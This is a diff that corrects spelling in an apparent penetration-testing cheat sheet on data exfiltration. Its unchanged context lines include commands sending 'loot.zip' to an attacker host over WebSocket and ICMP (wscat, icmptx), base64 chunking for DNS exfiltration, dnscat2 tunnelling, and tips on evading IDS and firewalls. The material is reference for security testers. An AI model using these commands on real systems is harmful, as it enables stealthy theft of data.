@@ -153,7 +153,7 @@ wscat -c wss://attacker/ws < loot.zip
 
 ### Basics {.col-span-3}
 
-DNS exfil via queries does not rely on a DNS response, but it does rely on DNS quries hitting infrastructure that the tester controls.
+DNS exfil via queries does not rely on a DNS response, but it does rely on DNS queries hitting infrastructure that the tester controls.
 
 In order for DNS exfiling to be possible you must first
 
@@ -185,7 +185,7 @@ The server should then reply with any of the following
 The response is irrelevant but is useful for disguising your attack. 
 
 ### dnscat2
-dnscat is an interactive DNS tunnel with DNS encrpytion. Not available on target host by default
+dnscat is an interactive DNS tunnel with DNS encryption. Not available on target host by default
 
 Start the server on Linux
 ```bash
@@ -204,7 +204,7 @@ download loot.zip
 
 ### Manual DNS Exfil (Linux)
 **YOU MUST CHUNK YOUR FILES!**
-DNS packets are normally smaller so large parkets WILL alert an IDS or appropriately baselined Firewall. 
+DNS packets are normally smaller so large packets WILL alert an IDS or appropriately baselined Firewall. 
 ```bash
 base64 loot.zip | tr -d '\n' | fold -w50 > chunks.txt
 
@@ -215,7 +215,7 @@ done < chunks.txt
 
 ### Manual DNS Exfil (Windows)
 **YOU MUST CHUNK YOUR FILES!**
-DNS packets are normally smaller so large parkets WILL alert an IDS or appropriately baselined Firewall. 
+DNS packets are normally smaller so large packets WILL alert an IDS or appropriately baselined Firewall. 
 ```powershell {.wrap}
 [Convert]::ToBase64String([IO.File]::ReadAllBytes("loot.zip"))  -replace '.{50}', '$&`n' | Out-File chunks.txt
 
@@ -304,7 +304,7 @@ Function Run-Pilot{
 
 ### icmptx
 
-Linux based imcp file exfil tool
+Linux based ICMP file exfil tool
 ```bash
 icmptx -f loot.zip attacker_ip
 ```
